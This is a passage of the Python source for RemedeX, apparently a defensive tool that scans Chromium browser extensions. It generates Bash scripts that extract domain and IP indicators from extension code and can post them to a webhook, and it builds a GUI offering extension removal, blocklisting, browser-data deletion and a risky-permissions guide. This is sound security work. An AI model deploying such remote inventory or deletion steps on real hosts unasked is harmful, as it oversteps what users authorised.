fi''')

        # IOC extraction for Bash lister
        if extract_iocs:
            # Python helper script for IOC extraction (shared by webhook and standalone)
            _ioc_python_helper = r'''import os, re, json, base64, sys
skip_d = {'w3.org','schema.org','github.com','chromium.org'}
noise_ip = {'0.0.0.0','127.0.0.1','255.255.255.255','255.255.255.0'}
dom_rx = re.compile(r'https?://(?:www\.)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,8})')
ip_rx = re.compile(r"(?:https?://|[\"'/=@])(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:[:/\s\"',;\)\]#?]|$)")
def vip(s):
    p=s.split('.')
    if len(p)!=4: return False
    for x in p:
        if not x.isdigit(): return False
        v=int(x)
        if v>254 or (len(x)>1 and x[0]=='0'): return False
    return int(p[0])!=0
def extract(d):
    iocs={}; t=d
    try: subs=[os.path.join(d,x) for x in os.listdir(d) if os.path.isdir(os.path.join(d,x)) and x[:1].isdigit()]
    except: subs=[]
    if subs: t=sorted(subs)[-1]
    for root,_,files in os.walk(t):
        for f in files:
            if not f.endswith('.js'): continue
            try: c=open(os.path.join(root,f),'r',errors='ignore').read(1048576)
            except: continue
            for m in dom_rx.finditer(c):
                v=m.group(1)
                if v in skip_d: continue
                iocs.setdefault(v,[])
                if f not in iocs[v]: iocs[v].append(f)
            for m in ip_rx.finditer(c):
                v=m.group(1)
                if v in noise_ip or not vip(v): continue
                iocs.setdefault(v,[])
                if f not in iocs[v]: iocs[v].append(f)
            for b in re.finditer(r'(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?',c):
                try: dc=base64.b64decode(b.group()).decode('utf-8',errors='ignore')
                except: continue
                for hm in dom_rx.finditer(dc):
                    v=hm.group(1)
                    if v in skip_d: continue
                    lbl=f'{f} (Base64)'; iocs.setdefault(v,[])
                    if lbl not in iocs[v]: iocs[v].append(lbl)
                for hm in ip_rx.finditer(dc):
                    v=hm.group(1)
                    if v in noise_ip or not vip(v): continue
                    lbl=f'{f} (Base64)'; iocs.setdefault(v,[])
                    if lbl not in iocs[v]: iocs[v].append(lbl)
    return iocs
results={}; seen=set()
for d in os.environ.get('_ALL_EXT_DIRS','').strip().split('\n'):
    d=d.strip()
    if not d or not os.path.isdir(d): continue
    eid=os.path.basename(d.rstrip('/'))
    if eid in seen: continue
    seen.add(eid)
    r=extract(d)
    if r:
        results[eid]=[{'indicator':k,'sources':v} for k,v in r.items()]
        print(f'  {eid}: {len(r)} IOC(s)',file=sys.stderr)
    else:
        print(f'  {eid}: clean',file=sys.stderr)
total=sum(len(v) for v in results.values())
print(f'Extracted {total} unique IOC(s) from {len(results)} extension(s).',file=sys.stderr)'''

            # Bash code to collect extension directories (template with browser path placeholders)
            _ioc_dir_collector = r'''
_ALL_EXT_DIRS=""
_OLD_IFS3="$IFS"; IFS=$'\n'; _ioc_homes=($(discover_home_dirs)); IFS="$_OLD_IFS3"
for _ih in "${_ioc_homes[@]}"; do
    [[ -z "$_ih" ]] && continue
    for _bp in "$_ih/__CHROME__" "$_ih/__EDGE__" "$_ih/__BRAVE__"; do
        [[ -d "$_bp" ]] || continue
        for _pd in "$_bp/Default" "$_bp"/Profile\ *; do
            _ep="$_pd/Extensions"
            [[ -d "$_ep" ]] || continue
            for _ed in "$_ep"/*/; do
                [[ -d "$_ed" ]] || continue
                _eid=$(basename "$_ed")
                [[ "$_eid" == "Temp" ]] && continue
                [[ "${#_eid}" -ne 32 ]] && continue
                _ALL_EXT_DIRS="${_ALL_EXT_DIRS}${_ed}"$'\n'
            done
        done
    done
done
export _ALL_EXT_DIRS'''.replace('__CHROME__', chrome_sub).replace('__EDGE__', edge_sub).replace('__BRAVE__', brave_sub)

            if wh_val:
                # Inject IOC extraction into the webhook section (guarded by python3 check)
                ioc_wh_code = (
                    '    # --- Extract Network IOCs ---\n'
                    '    if command -v python3 &>/dev/null; then\n'
                    '    echo ""\n'
                    '    echo "=== Extracting Network IOCs from extension source code... ==="\n'
                    + '\n'.join('    ' + line if line.strip() else line for line in _ioc_dir_collector.split('\n'))
                    + "\n    IOC_JSON=$(python3 << 'PYEOF'\n"
                    + _ioc_python_helper + '\n'
                    + 'print(json.dumps(results))\n'
                    + 'PYEOF\n'
                    + '    )\n'
                    + '    [[ -z "$IOC_JSON" ]] && IOC_JSON="{}"\n'
                    + '    else\n'
                    + '    echo ""\n'
                    + '    echo "WARNING: python3 not found - skipping network IOC extraction." >&2\n'
                    + '    IOC_JSON="{}"\n'
                    + '    fi\n'
                )
                script = script.replace(
                    '    WH_PAYLOAD="{',
                    ioc_wh_code + '    WH_PAYLOAD="{'
                )
                script = script.replace(
                    r'\"output\":$ESCAPED_OUT}"',
                    r'\"output\":$ESCAPED_OUT,\"network_iocs\":$IOC_JSON}"'
                )
            else:
                # Standalone IOC display for non-webhook mode (guarded by python3 check)
                script += (
                    '\n# --- Network IOC Extraction (standalone display) ---\n'
                    'if command -v python3 &>/dev/null; then\n'
                    'echo ""\n'
                    'echo "===== NETWORK IOC EXTRACTION ====="\n'
                    + _ioc_dir_collector + '\n'
                    + "python3 << 'PYEOF'\n"
                    + _ioc_python_helper + '\n'
                    + 'for eid, iocs in results.items():\n'
                    + '    print(f"  {eid}:")\n'
                    + '    for ioc in iocs:\n'
                    + '''        print(f"    {ioc['indicator']}  [{', '.join(ioc['sources'])}]")\n'''
                    + 'PYEOF\n'
                    + 'echo "===== END OF IOC EXTRACTION ====="\n'
                    + 'else\n'
                    + 'echo ""\n'
                    + 'echo "WARNING: python3 not found - skipping network IOC extraction."\n'
                    + 'echo "Install python3 to enable IOC extraction, or use the Windows (PowerShell) lister instead."\n'
                    + 'fi\n'
                )

        return script


def run_gui():
    """Run the graphical user interface"""
    try:
        import tkinter as tk
        from tkinter import ttk, messagebox, scrolledtext
    except ImportError:
        print("ERROR: tkinter not available. Use CLI mode instead.")
        sys.exit(1)
    
    class ToolTip:
        """Hover tooltip for tkinter widgets."""
        def __init__(self, widget, text, wrap_length=300):
            self.widget = widget
            self.text = text
            self.wrap_length = wrap_length
            self.tip_window = None
            widget.bind("<Enter>", self._show)
            widget.bind("<Leave>", self._hide)

        def _show(self, event=None):
            if self.tip_window:
                return
            self.tip_window = tw = tk.Toplevel(self.widget)
            tw.wm_overrideredirect(True)
            label = tk.Label(tw, text=self.text, justify="left", wraplength=self.wrap_length,
                             background="#333333", foreground="#ffffff",
                             relief="solid", borderwidth=1,
                             font=("Segoe UI", 9), padx=8, pady=6)
            label.pack()
            tw.update_idletasks()
            tip_w = tw.winfo_reqwidth()
            tip_h = tw.winfo_reqheight()
            screen_w = self.widget.winfo_screenwidth()
            screen_h = self.widget.winfo_screenheight()
            x = self.widget.winfo_rootx() + 20
            y = self.widget.winfo_rooty() + self.widget.winfo_height() + 5
            if x + tip_w > screen_w - 10:
                x = screen_w - tip_w - 10
            if y + tip_h > screen_h - 40:
                y = self.widget.winfo_rooty() - tip_h - 5
            tw.wm_geometry(f"+{x}+{y}")

        def _hide(self, event=None):
            if self.tip_window:
                self.tip_window.destroy()
                self.tip_window = None

    class ExtensionManagerGUI:
        def __init__(self):
            self.root = tk.Tk()
            self.root.title("RemedeX")
            self.root.resizable(True, True)
            
            self.manager = BrowserExtensionManager(verbose=False)
            self.selected_extensions: Set[str] = set()
            self.is_dark_mode = False
            # If user declines Web Store enrichment, do not ask again until restart.
            self._metadata_enrich_declined = False
            
            self.setup_styles()
            self.setup_ui()
            self.apply_theme()
            self._fit_to_screen(self.root, 1280, 800, min_w=1160, min_h=580)
        
        def setup_styles(self):
            """Configure ttk styles for a modern look"""
            self.style = ttk.Style()
            try: self.style.theme_use('clam')
            except: pass

        def _make_toplevel(self, parent=None):
            """Create a Toplevel window pre-styled with the current theme."""
            win = tk.Toplevel(parent or self.root)
            dm = getattr(self, 'is_dark_mode', False)
            win.configure(bg="#2b2d31" if dm else "#f0f2f5")
            return win

        @staticmethod
        def _get_work_area():
            """Return (x, y, width, height) of the usable desktop area (excludes taskbar)."""
            try:
                import ctypes
                rect = ctypes.wintypes.RECT()
                ctypes.windll.user32.SystemParametersInfoW(0x0030, 0, ctypes.byref(rect), 0)  # SPI_GETWORKAREA
                return rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top
            except Exception:
                pass
            return None

        def _fit_to_screen(self, win, desired_w, desired_h, min_w=None, min_h=None):
            """Set geometry capped to the usable work area and centered.

            Uses the OS work area (screen minus taskbar) when available,
            otherwise falls back to 90% of full screen as a safe estimate.
            """
            win.update_idletasks()
            work = self._get_work_area()
            if work:
                wa_x, wa_y, wa_w, wa_h = work
            else:
                wa_x, wa_y = 0, 0
                wa_w = int(win.winfo_screenwidth() * 0.96)
                wa_h = int(win.winfo_screenheight() * 0.90)
            margin = 8
            max_w = wa_w - margin * 2
            max_h = wa_h - margin * 2
            w = min(desired_w, max_w)
            h = min(desired_h, max_h)
            x = wa_x + max(0, (wa_w - w) // 2)
            y = wa_y + max(0, (wa_h - h) // 2)
            win.geometry(f"{w}x{h}+{x}+{y}")
            if min_w or min_h:
                mw = min(min_w or w, max_w)
                mh = min(min_h or h, max_h)
                win.minsize(mw, mh)

        def apply_theme(self):
            # Dark mode uses true dark-gray (like Discord/VS Code), NOT near-black
            bg_color = "#2b2d31" if self.is_dark_mode else "#f0f2f5"
            fg_color = "#dcddde" if self.is_dark_mode else "#111827"
            panel_bg = "#313338" if self.is_dark_mode else "#ffffff"
            text_fg = "#b5bac1" if self.is_dark_mode else "#374151"
            border_col = "#4e5058" if self.is_dark_mode else "#cbd5e1"  # Slightly more distinct border color
            
            self.root.configure(bg=bg_color)
            
            self.style.configure(".", background=bg_color, foreground=fg_color, font=("Segoe UI", 9))
            self.style.configure("TFrame", background=bg_color)
            self.style.configure("Panel.TFrame", background=panel_bg, relief="solid", borderwidth=1, bordercolor=border_col)
            
            self.style.configure("Title.TLabel", font=("Segoe UI", 18, "bold"), background=bg_color, foreground=fg_color)
            self.style.configure("Subtitle.TLabel", font=("Segoe UI", 10), background=bg_color, foreground=text_fg)
            self.style.configure("PanelTitle.TLabel", font=("Segoe UI", 11, "bold"), background=panel_bg, foreground=fg_color)
            self.style.configure("PanelSub.TLabel", font=("Segoe UI", 9), background=panel_bg, foreground=text_fg)
            
            self.style.configure("TLabelframe", background=bg_color, bordercolor=border_col, relief="solid", borderwidth=1)
            self.style.configure("TLabelframe.Label", font=("Segoe UI", 10, "bold"), background=bg_color, foreground=fg_color)
            
            self.style.configure("Section.TLabelframe", background=bg_color, bordercolor=border_col, relief="solid", borderwidth=1)
            self.style.configure("Section.TLabelframe.Label", font=("Segoe UI", 10, "bold"), background=bg_color, foreground=fg_color)
            
            # Button styles - More defined with border/relief
            btn_bg = "#404249" if self.is_dark_mode else "#f8f9fa"
            btn_fg = "#dcddde" if self.is_dark_mode else "#111827"
            border_col_btn = "#4e5058" if self.is_dark_mode else "#d1d5db"
            
            self.style.configure("TButton", padding=(4, 4), background=btn_bg, foreground=btn_fg, bordercolor=border_col_btn, relief="raised", borderwidth=2, font=("Segoe UI", 9, "bold"))
            self.style.map("TButton", background=[("active", "#4b5363" if self.is_dark_mode else "#e5e7eb")], relief=[("pressed", "sunken")])
            
            self.style.configure("Primary.TButton", background="#3b82f6", foreground="#ffffff", relief="raised", borderwidth=2)
            self.style.map("Primary.TButton", background=[("active", "#2563eb")], relief=[("pressed", "sunken")])
            
            self.style.configure("Danger.TButton", background="#ef4444", foreground="#ffffff", relief="raised", borderwidth=2)
            self.style.map("Danger.TButton", background=[("active", "#dc2626")], relief=[("pressed", "sunken")])
            
            # Notebook styles
            self.style.configure("TNotebook", background=bg_color)
            self.style.configure("TNotebook.Tab", background=panel_bg, foreground=text_fg, padding=(10, 4), font=("Segoe UI", 9))
            self.style.map("TNotebook.Tab", background=[("selected", btn_bg)], foreground=[("selected", fg_color)])
            
            # Combobox styles
            self.style.configure("TCombobox", fieldbackground=panel_bg, background=bg_color, foreground=text_fg, arrowcolor=fg_color)
            self.style.map("TCombobox", fieldbackground=[("readonly", panel_bg)], selectbackground=[("readonly", btn_bg)], selectforeground=[("readonly", fg_color)])
            self.root.option_add('*TCombobox*Listbox.background', panel_bg)
            self.root.option_add('*TCombobox*Listbox.foreground', text_fg)
            self.root.option_add('*TCombobox*Listbox.selectBackground', btn_bg)
            self.root.option_add('*TCombobox*Listbox.selectForeground', fg_color)
            
            # Checkbutton/Radiobutton styles
            self.style.configure("TCheckbutton", background=bg_color, foreground=fg_color)
            self.style.map("TCheckbutton", background=[("active", bg_color)], foreground=[("active", fg_color)], indicatorcolor=[("selected", "#3b82f6")])
            self.style.configure("TRadiobutton", background=bg_color, foreground=fg_color)
            self.style.map("TRadiobutton", background=[("active", bg_color)], foreground=[("active", fg_color)], indicatorcolor=[("selected", "#3b82f6")])
            
            # Entry styles
            self.style.configure("TEntry", fieldbackground=panel_bg, foreground=text_fg, insertcolor=text_fg)
            self.style.map("TEntry", fieldbackground=[("focus", btn_bg)])
            self.root.option_add('*TEntry*foreground', text_fg)
            
            # Treeview tweaks
            tree_bg = "#313338" if self.is_dark_mode else "#ffffff"
            tree_fg = "#dcddde" if self.is_dark_mode else "#000000"
            self.style.configure("Treeview", background=tree_bg, foreground=tree_fg, fieldbackground=tree_bg, borderwidth=0)
            self.style.map("Treeview", background=[("selected", "#5865f2")], foreground=[("selected", "#ffffff")])
            
            self.style.configure("Treeview.Heading", background=btn_bg, foreground=btn_fg, font=("Segoe UI", 9, "bold"), relief="flat")
            self.style.map("Treeview.Heading", background=[("active", panel_bg)], foreground=[("active", btn_fg)])
            
            # Dynamically update Treeview tags so rows are readable against dynamic backgrounds
            try:
                if self.is_dark_mode:
                    self.tree.tag_configure("critical", background="#5c2020", foreground="#fecaca")
                    self.tree.tag_configure("high", background="#5c3a00", foreground="#fed7aa")
                    self.tree.tag_configure("medium", background="#4a4a00", foreground="#fef08a")
                    self.tree.tag_configure("low", background="#1a3d24", foreground="#86efac")
                    self.tree.tag_configure("safe", background="#313338", foreground="#dcddde")
                    self.tree.tag_configure("trusted", background="#1e3a4a", foreground="#7dd3fc")
                else:
                    self.tree.tag_configure("critical", background="#fde8e8", foreground="#000000")
                    self.tree.tag_configure("high", background="#fef3c7", foreground="#000000")
                    self.tree.tag_configure("medium", background="#fffbeb", foreground="#000000")
                    self.tree.tag_configure("low", background="#f0fdf4", foreground="#000000")
                    self.tree.tag_configure("safe", background="#ffffff", foreground="#000000")
                    self.tree.tag_configure("trusted", background="#e8f8f5", foreground="#1e8449")
            except AttributeError:
                pass # Tree not built yet when __init__ calls apply_theme
                
            # Update specific tk.Text widgets that don't inherit ttk themes
            text_bg_val = "#21252b" if self.is_dark_mode else "#ffffff"
            text_fg_val = "#e5e7eb" if self.is_dark_mode else "#111827"
            try:
                self.details_text.configure(bg=text_bg_val, fg=text_fg_val, insertbackground=text_fg_val)
            except AttributeError:
                pass
        
        def setup_ui(self):
            # Main container
            main_frame = ttk.Frame(self.root, padding="10")
            main_frame.grid(row=0, column=0, sticky="nsew")
            
            self.root.columnconfigure(0, weight=1)
            self.root.rowconfigure(0, weight=1)
            main_frame.columnconfigure(0, weight=1)
            main_frame.rowconfigure(3, weight=1)  # Extension list row expands
            
            # === HEADER SECTION ===
            header_frame = ttk.Frame(main_frame)
            header_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
            header_frame.columnconfigure(0, weight=1)
            
            title_text = ttk.Frame(header_frame)
            title_text.grid(row=0, column=0, sticky="w")
            ttk.Label(title_text, text="RemedeX", style="Title.TLabel").pack(anchor="w")
            ttk.Label(title_text, text="Browser extension security, analysis & cleanup", style="Subtitle.TLabel").pack(anchor="w")
            
            def toggle_theme():
                self.is_dark_mode = not self.is_dark_mode
                self.apply_theme()
            ttk.Button(header_frame, text="🌓 Toggle Theme", command=toggle_theme).grid(row=0, column=1, sticky="e")
            
            # === ACTIONS SECTION (Categorized) ===
            actions_frame = ttk.LabelFrame(main_frame, text="  Actions  ", padding="10", style="Section.TLabelframe")
            actions_frame.grid(row=1, column=0, sticky="ew", pady=(0, 10))
            actions_frame.columnconfigure((0, 1, 2), weight=1, minsize=280)

            # 1. Manage Extensions
            cat1 = ttk.Frame(actions_frame, style="Panel.TFrame", padding=10)
            cat1.grid(row=0, column=0, sticky="nsew", padx=5)
            ttk.Label(cat1, text="Manage Extensions", style="PanelTitle.TLabel").pack(anchor="w")
            ttk.Label(cat1, text="Discover, inspect, and remove browser extensions locally", style="PanelSub.TLabel").pack(anchor="w", pady=(0,10))
            
            btn_row1a = ttk.Frame(cat1, style="Panel.TFrame")
            btn_row1a.pack(fill="x", pady=2)
            btn = ttk.Button(btn_row1a, text="Scan System", command=self.scan_extensions)
            btn.pack(side="left", padx=2, fill="x", expand=True)
            ToolTip(btn, "Scan Chromium-based browsers (Chrome, Edge, Brave) for installed extensions.\nReads manifest.json from each profile, extracts permissions, and runs heuristic analysis.")
            btn = ttk.Button(btn_row1a, text="Analyze Selected", command=self.analyze_selected, style="Primary.TButton")
            btn.pack(side="left", padx=2, fill="x", expand=True)
            ToolTip(btn, "Open a detailed analysis view for the selected extension.\nShows permissions breakdown, extracted domains/IPs, obfuscation detection, heuristic warnings, and risk scoring.\nIncludes options to export a forensic report or run a VirusTotal scan.")
            
            btn_row1b = ttk.Frame(cat1, style="Panel.TFrame")
            btn_row1b.pack(fill="x", pady=2)
            btn = ttk.Button(btn_row1b, text="Remove Selected", command=self.remove_selected, style="Danger.TButton")
            btn.pack(side="left", padx=2, fill="x", expand=True)
            ToolTip(btn, "Remove the selected extension(s) from the local system.\nUse Ctrl+Click or Shift+Click to select multiple rows.\nForce-closes the browser, deletes extension files, cleans Preferences/Secure Preferences entries,\nand optionally adds the ID to the OS-level ExtensionInstallBlocklist policy (see 'Blocklist on Removal').")
            btn = ttk.Button(btn_row1b, text="Copy to Folder", command=self.copy_selected)
            btn.pack(side="left", padx=2, fill="x", expand=True)
            ToolTip(btn, "Copy the selected extension's source files to a folder for offline analysis.\nUseful for archiving evidence or analyzing the extension code outside the browser.")

            # 2. Forensic Tools
            cat2 = ttk.Frame(actions_frame, style="Panel.TFrame", padding=10)
            cat2.grid(row=0, column=1, sticky="nsew", padx=5)
            ttk.Label(cat2, text="Forensic Tools", style="PanelTitle.TLabel").pack(anchor="w")
            ttk.Label(cat2, text="Deep-scan extensions, generate reports, and query threat intelligence", style="PanelSub.TLabel").pack(anchor="w", pady=(0,10))
            
            btn_row2a = ttk.Frame(cat2, style="Panel.TFrame")
            btn_row2a.pack(fill="x", pady=2)
            btn = ttk.Button(btn_row2a, text="Analyze Local Folder", command=self.scan_folder_dialog)
            btn.pack(side="left", padx=1, fill="x", expand=True)
            ToolTip(btn, "Analyze an extension from a local folder (e.g., a downloaded/extracted CRX).\nParses manifest.json, scans all JS files for domains/IPs, detects obfuscation,\nand produces a full risk assessment — without needing the extension to be installed.")
            btn = ttk.Button(btn_row2a, text="Scan Network IOCs (VT)", command=self.show_batch_vt_dialog)
            btn.pack(side="left", padx=1, fill="x", expand=True)
            ToolTip(btn, "Scan extracted domains, IPs, and file hashes from scanned extensions against VirusTotal.\nRequires a VT API key. Checks each indicator for known malware detections,\nphishing associations, and community reputation scores.")
            
            btn_row2b = ttk.Frame(cat2, style="Panel.TFrame")
            btn_row2b.pack(fill="x", pady=2)
            btn = ttk.Button(btn_row2b, text="Export HTML Report", command=self.export_report)
            btn.pack(side="left", padx=1, fill="x", expand=True)
            ToolTip(btn, "Generate a standalone HTML forensic report of all scanned extensions.\nIncludes risk scores, permission analysis, extracted domains, heuristic warnings,\nand VirusTotal results (if scanned). Can be shared with security teams.")
            btn = ttk.Button(btn_row2b, text="Download from Store", command=self.show_download_dialog)
            btn.pack(side="left", padx=1, fill="x", expand=True)
            ToolTip(btn, "Download an extension directly from the Chrome Web Store by its ID or URL.\nDownloads the .crx file, extracts it, and optionally runs a full analysis.\nUseful for analyzing extensions before they are installed.")

            # 3. System & Network
            cat3 = ttk.Frame(actions_frame, style="Panel.TFrame", padding=10)
            cat3.grid(row=0, column=2, sticky="nsew", padx=5)
            ttk.Label(cat3, text="System & Environment", style="PanelTitle.TLabel").pack(anchor="w")
            ttk.Label(cat3, text="Remote deployment, policy enforcement, and cleanup tools", style="PanelSub.TLabel").pack(anchor="w", pady=(0,10))
            
            btn_row3a = ttk.Frame(cat3, style="Panel.TFrame")
            btn_row3a.pack(fill="x", pady=2)
            btn = ttk.Button(btn_row3a, text="Clean Browser Data", command=self.show_cleanup_dialog)
            btn.pack(side="left", padx=1, fill="x", expand=True)
            ToolTip(btn, "Delete browser data from the quick-clean dialog: Local Storage, disk caches, service workers;\noptional cookies. Session Storage and IndexedDB are available in generated Cleanup Scripts, not this dialog.\nBrowsers are closed automatically when needed.")
            btn = ttk.Button(btn_row3a, text="Manage Blocklist", command=self.show_blocklist_manager)
            btn.pack(side="left", padx=1, fill="x", expand=True)
            ToolTip(btn, "View and manage the OS-level extension blocklist (Windows Registry / macOS managed preferences / Linux policy).\nBlocklisted extensions are prevented from being installed or re-enabled by any user.\nSupports export, clear, and per-extension unblock.")
            btn = ttk.Button(btn_row3a, text="Remote Lister", command=self.show_extension_lister_dialog)
            btn.pack(side="left", padx=1, fill="x", expand=True)
            ToolTip(btn, "Generate a script (PowerShell/Bash) that inventories all installed browser extensions on a remote host.\nDesigned for deployment via EDR tools (SentinelOne, CrowdStrike, etc.).\nOutputs results to a log file and optionally sends them to a webhook.")
            
            btn_row3b = ttk.Frame(cat3, style="Panel.TFrame")
            btn_row3b.pack(fill="x", pady=2)
            btn = ttk.Button(btn_row3b, text="Cleanup Scripts", command=self.show_script_dialog)
            btn.pack(side="left", padx=1, fill="x", expand=True)
            ToolTip(btn, "Generate cross-platform cleanup scripts (PowerShell/Bash/Python) for remote extension removal.\nScripts force-close browsers, remove extension files, clean Preferences, disable sync,\nand apply blocklist policies. Deployable via EDR or remote shell.")
            btn = ttk.Button(btn_row3b, text="Permissions Dict", command=self.show_permissions_dictionary)
            btn.pack(side="left", padx=1, fill="x", expand=True)
            ToolTip(btn, "Browse the built-in permissions dictionary — a reference of all Chrome extension API permissions\nwith risk levels (CRITICAL/HIGH/MEDIUM/LOW), descriptions, legitimate uses, and potential malicious uses.")
            btn = ttk.Button(btn_row3b, text="Batch IOC Extract", command=self.show_batch_domains_dialog)
            btn.pack(side="left", padx=1, fill="x", expand=True)
            ToolTip(btn, "Download extensions by ID from the Chrome Web Store and extract network artifacts (domains, IPs, URLs).\n"
                         "Accepts extension IDs, JSON lister output, or CSV files.\n"
                         "Scans JavaScript and HTML for hardcoded URLs, domains, IPs (including Base64-encoded),\n"
                         "and aggregates results into a report.", wrap_length=450)
            
            # === FILTER SECTION ===
            filter_frame = ttk.LabelFrame(main_frame, text="  Filters  ", padding="10", style="Section.TLabelframe")
            filter_frame.grid(row=2, column=0, sticky="ew", pady=(0, 10))
            
            # Filter row 1: Search and Browser
            filter_row1 = ttk.Frame(filter_frame)
            filter_row1.pack(fill="x", pady=(0, 8))
            
            # Search box
            ttk.Label(filter_row1, text="Search:").pack(side="left", padx=(0, 5))
            self.search_var = tk.StringVar()
            self.search_var.trace_add("write", lambda *args: self.refresh_list())
            search_entry = ttk.Entry(filter_row1, textvariable=self.search_var, width=30)
            search_entry.pack(side="left", padx=(0, 20))
            
            # Browser filter - only show installed browsers
            ttk.Label(filter_row1, text="Browser:").pack(side="left", padx=(0, 5))
            self.browser_filter_var = tk.StringVar(value="All")
            installed_browsers = ["All"] + self.manager.get_installed_browsers()
            self.browser_combo = ttk.Combobox(filter_row1, textvariable=self.browser_filter_var,
                                        values=installed_browsers,
                                        state="readonly", width=12)
            self.browser_combo.pack(side="left", padx=(0, 20))
            self.browser_combo.bind("<<ComboboxSelected>>", lambda e: self.refresh_list())
            
            # Filter row 2: Checkboxes
            filter_row2 = ttk.Frame(filter_frame)
            filter_row2.pack(fill="x")
            
            self.warn_only_var = tk.BooleanVar(value=False)
            warn_check = ttk.Checkbutton(filter_row2, text="Show only risky extensions",
                          variable=self.warn_only_var,
                          command=self.refresh_list)
            warn_check.pack(side="left", padx=(0, 20))
            
            # Help icon for warning explanation
            warn_help = ttk.Label(filter_row2, text="(?)", foreground="#0066cc", cursor="hand2")
            warn_help.pack(side="left", padx=(0, 30))
            warn_help.bind("<Button-1>", self.show_permissions_help)
            
            self.show_details_var = tk.BooleanVar(value=False)
            ttk.Checkbutton(filter_row2, text="Show full permissions in list",
                          variable=self.show_details_var,
                          command=self.refresh_list).pack(side="left")
            self.blocklist_var = tk.BooleanVar(value=True)
            ttk.Checkbutton(filter_row2, text="Blocklist on Removal",
                          variable=self.blocklist_var).pack(side="left", padx=(10, 2))
            blocklist_help = ttk.Label(filter_row2, text="(?)", foreground="#0066cc", cursor="hand2")
            blocklist_help.pack(side="left")
            blocklist_help.bind("<Button-1>", lambda e: messagebox.showinfo("Blocklist Help", "When checked, removing an extension will also add its ID to the OS-level ExtensionInstallBlocklist enterprise policy.\n\nThis prevents the extension from being reinstalled via sync or the Chrome Web Store.\n\nOn Windows, if normal registry access is blocked (Access Denied), RemedeX will prompt for Administrator (UAC) and retry using a short elevated PowerShell step.\n\nEnabled by default. Uncheck for a temporary removal without policy blocking."))
            
            # === EXTENSION LIST SECTION ===
            list_frame = ttk.LabelFrame(main_frame, text="  Installed Extensions  ", padding="5", style="Section.TLabelframe")
            list_frame.grid(row=3, column=0, sticky="nsew", pady=(0, 10))
            list_frame.columnconfigure(0, weight=1)
            list_frame.rowconfigure(0, weight=1)
            
            # Treeview for extensions
            columns = ("name", "id", "version", "browser", "profile", "risk_score", "permissions")
            self.tree = ttk.Treeview(list_frame, columns=columns, show="headings", 
                                    selectmode="extended")
            
            self.tree.heading("name", text="Name ▼", command=lambda: self.sort_column("name"))
            self.tree.heading("id", text="Extension ID", command=lambda: self.sort_column("id"))
            self.tree.heading("version", text="Version", command=lambda: self.sort_column("version"))
            self.tree.heading("browser", text="Browser", command=lambda: self.sort_column("browser"))
            self.tree.heading("profile", text="Profile", command=lambda: self.sort_column("profile"))
            self.tree.heading("risk_score", text="Risk", command=lambda: self.sort_column("risk_score"))
            self.tree.heading("permissions", text="Permissions (Risk Level)")
            
            self.tree.column("name", width=200, minwidth=100)
            self.tree.column("id", width=250, minwidth=100)
            self.tree.column("version", width=55, minwidth=40)
            self.tree.column("browser", width=65, minwidth=50)
            self.tree.column("profile", width=65, minwidth=50)
            self.tree.column("risk_score", width=50, minwidth=40, anchor="center")
            self.tree.column("permissions", width=350, minwidth=200, stretch=True)
            
            # Scrollbars
            vsb = ttk.Scrollbar(list_frame, orient="vertical", command=self.tree.yview)
            hsb = ttk.Scrollbar(list_frame, orient="horizontal", command=self.tree.xview)
            self.tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
            
            self.tree.grid(row=0, column=0, sticky="nsew")
            vsb.grid(row=0, column=1, sticky="ns")
            hsb.grid(row=1, column=0, sticky="ew")
            
            # Extension count label
            self.count_var = tk.StringVar(value="")
            ttk.Label(list_frame, textvariable=self.count_var, style="Subtitle.TLabel").grid(row=2, column=0, sticky="w", pady=(5, 0))
            
            # === DETAILS PANEL ===
            details_frame = ttk.LabelFrame(main_frame, text="  Extension Details (select an extension above)  ", padding="5", style="Section.TLabelframe")
            details_frame.grid(row=4, column=0, sticky="nsew", pady=(0, 10))
            details_frame.columnconfigure(0, weight=1)
            details_frame.rowconfigure(0, weight=1)
            main_frame.rowconfigure(4, weight=1)  # Allow details panel to expand
            
            # Create a frame with both vertical and horizontal scrollbars
            text_frame = ttk.Frame(details_frame)
            text_frame.grid(row=0, column=0, sticky="nsew")
            text_frame.columnconfigure(0, weight=1)
            text_frame.rowconfigure(0, weight=1)
            
            self.details_text = tk.Text(text_frame, height=12, width=100, 
                                        font=("Consolas", 9), wrap="none")
            
            # Vertical scrollbar
            v_scroll = ttk.Scrollbar(text_frame, orient="vertical", command=self.details_text.yview)
            v_scroll.grid(row=0, column=1, sticky="ns")
            
            # Horizontal scrollbar
            h_scroll = ttk.Scrollbar(text_frame, orient="horizontal", command=self.details_text.xview)
            h_scroll.grid(row=1, column=0, sticky="ew")
            
            self.details_text.configure(yscrollcommand=v_scroll.set, xscrollcommand=h_scroll.set)
            self.details_text.grid(row=0, column=0, sticky="nsew")
            
            self.details_text.insert("1.0", "Select an extension from the list above to view its details.\n\n"
                                     "Details include: full permissions list, manifest version, host permissions, "
                                     "content scripts, and installation path.")
            self.details_text.config(state="disabled")
            
            self.tree.bind("<<TreeviewSelect>>", self.on_select)
            
            # === STATUS BAR ===
            status_frame = ttk.Frame(main_frame)
            status_frame.grid(row=5, column=0, sticky="ew")
            
            self.status_var = tk.StringVar(value="Ready - Click 'Scan Extensions' to start")
            status_bar = ttk.Label(status_frame, textvariable=self.status_var,
                                  relief="sunken", anchor="w", padding=3)
            status_bar.pack(fill="x")
        
        def show_permissions_help(self, event=None):
            """Show explanation of what triggers the warning indicator"""
            help_text = """RISKY EXTENSION INDICATORS

An extension is marked with [RISK] if it has ANY of these potentially dangerous permissions:

SENSITIVE PERMISSIONS:
• <all_urls> - Access to ALL websites you visit
• *://*/* - Same as above, wildcard access to all sites  
• http://*/* or https://*/* - Access to all HTTP/HTTPS sites
• tabs - Can see your browsing activity and tab URLs
• webRequest / webRequestBlocking - Can intercept and modify ALL network traffic
• cookies - Can read/write cookies for any site
• history - Can read your complete browsing history
• downloads - Can download files without prompts
• clipboardRead / clipboardWrite - Can access your clipboard
• management - Can manage other extensions (install/remove)
• nativeMessaging - Can communicate with programs on your computer
• debugger - Full debugging access to pages
• proxy - Can route your traffic through arbitrary servers
